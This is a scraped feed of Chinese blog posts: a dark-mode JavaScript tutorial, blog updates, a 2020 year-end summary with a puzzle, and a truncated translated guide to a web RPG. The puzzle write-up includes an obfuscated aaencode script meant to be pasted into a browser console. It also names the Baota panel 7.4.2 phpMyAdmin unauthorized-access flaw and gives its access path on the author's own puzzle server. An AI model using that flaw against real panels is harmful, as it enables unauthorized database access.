CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 